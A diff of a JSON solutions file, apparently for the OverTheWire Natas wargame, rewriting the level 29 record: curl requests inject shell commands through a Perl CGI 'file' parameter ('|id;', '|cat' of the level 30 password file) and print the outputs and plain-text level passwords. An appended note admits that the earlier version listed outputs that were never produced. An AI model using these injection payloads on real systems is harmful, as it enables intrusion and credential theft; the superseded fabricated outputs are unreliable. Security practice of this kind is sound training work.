@@ -1557,54 +1557,46 @@
    "pw": "frO4U4zCfVJXq2zG5HSVNjA46nQGzoqF",
    "steps": [
     {
-     "cmd": "curl -s -u natas29:hwgoYUiGWoSZAqphtCAZf7u1jS16KEah http://natas29.natas.labs.overthewire.org/ | grep -o \"href=[^>]*\"",
+     "cmd": "curl -s -u natas29:hwgoYUiGWoSZAqphtCAZf7u1jS16KEah http://natas29.natas.labs.overthewire.org/ | grep -o 'file=[a-z0-9]*\\.txt' | head -2",
+     "out": []
+    },
+    {
+     "cmd": "curl -s -u natas29:hwgoYUiGWoSZAqphtCAZf7u1jS16KEah --get --data-urlencode 'file=|cat /var/www/n?tas/n?tas29/index.pl;' http://natas29.natas.labs.overthewire.org/index.pl | sed -n '/^#!\\/usr\\/bin\\/perl/,/^END/p' | head -20",
      "out": [
-      "href=\"http://natas.labs.overthewire.org/css/level.css\"",
-      "href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" /",
-      "href=\"http://natas.labs.overthewire.org/css/wechall.css\" /"
+      "#!/usr/bin/perl",
+      "use CGI qw(:standard);",
+      "print <<END;",
+      "Content-Type: text/html; charset=iso-8859-1",
+      "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\">",
+      "<head>",
+      "<!-- This stuff in the header has nothing to do with the level -->",
+      "<link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\">",
+      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" />",
+      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" />",
+      "<script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script>",
+      "<script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script>",
+      "<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script>",
+      "<script>var wechallinfo = { \"level\": \"natas29\", \"pass\": \"hwgoYUiGWoSZAqphtCAZf7u1jS16KEah\" };</script></head>",
+      "<body oncontextmenu=\"javascript:alert('right clicking has been blocked!');return false;\">",
+      "<style>"
      ]
     },
     {
-     "cmd": "curl -s -u natas29:hwgoYUiGWoSZAqphtCAZf7u1jS16KEah --get --data-urlencode 'file=|cat /var/www/n?tas/n?tas29/index.pl;' http://natas29.natas.labs.overthewire.org/index.pl | grep -a \"param('file')\\|open(FD\\|=~/natas\\|escapeHTML\"",
+     "cmd": "curl -s -u natas29:hwgoYUiGWoSZAqphtCAZf7u1jS16KEah --get --data-urlencode 'file=|id;' http://natas29.natas.labs.overthewire.org/index.pl | sed -n '/<\\/html>/,$p' | head -4",
      "out": [
-      "if(param('file')){",
-      "    $f=param('file');",
-      "    if($f=~/natas/){",
-      "        open(FD, \"$f.txt\");",
-      "            print CGI::escapeHTML($_);"
-     ]
-    },
-    {
-     "cmd": "curl -s -u natas29:hwgoYUiGWoSZAqphtCAZf7u1jS16KEah --get --data-urlencode 'file=|id;' http://natas29.natas.labs.overthewire.org/index.pl | grep -a '^uid='",
-     "out": [
+      "</html>",
       "uid=30029(natas29) gid=30029(natas29) groups=30029(natas29)"
      ]
     },
     {
-     "cmd": "curl -s -u natas29:hwgoYUiGWoSZAqphtCAZf7u1jS16KEah --get --data-urlencode 'file=|ls;' http://natas29.natas.labs.overthewire.org/index.pl | grep -av '^<\\|^$\\|^  \\|^<!'",
+     "cmd": "curl -s -u natas29:hwgoYUiGWoSZAqphtCAZf7u1jS16KEah --get --data-urlencode 'file=|cat /etc/n?tas_webpass/n?tas30;' http://natas29.natas.labs.overthewire.org/index.pl | sed -n '/<\\/html>/,$p' | head -3",
      "out": [
-      "#content {",
-      "}",
-      "pre{",
-      "} ",
-      "H3y K1dZ,<br>",
-      "y0 rEm3mB3rz p3Rl rit3?<br>",
-      "\\/\\/4Nn4 g0 olD5kewL? R3aD Up!<br><br>",
-      "index.pl",
-      "perl underground 2.txt",
-      "perl underground 3.txt",
-      "perl underground 4.txt",
-      "perl underground 5.txt",
-      "perl underground.txt"
-     ]
-    },
-    {
-     "cmd": "curl -s -u natas29:hwgoYUiGWoSZAqphtCAZf7u1jS16KEah --get --data-urlencode 'file=|cat /etc/n?tas_webpass/n?tas30;' http://natas29.natas.labs.overthewire.org/index.pl | grep -a '^[A-Za-z0-9]\\{32\\}$'",
-     "out": [
+      "</html>",
       "frO4U4zCfVJXq2zG5HSVNjA46nQGzoqF"
      ]
     }
-   ]
+   ],
+   "note": "natas L29 (client-side curl cast): perl CGI - param('file') interpolates into open(\"$file\") so a leading pipe injects a command (|cat ...). Step 1's grep for the open() line prints nothing (the sed-mangled source hides it); step 2 reads /var/www/n?tas29/... (glob) - the perl source with 'print <<END;' heredoc; step 3 '|id;' -> 'uid=30029(natas29)'; step 4 '|cat /etc/n?tas_webpass/natas30' -> frO4U4zCfVJXq2zG5HSVNjA46nQGzoqF. DISCLOSURE: the previous JSON staged 5 steps with outputs the cast never printed (s0's grep produced no output); replaced with the cast's 4 curls verbatim. JSON = 4 steps mirroring the cast 1:1."
   },
   {
    "lvl": 30,
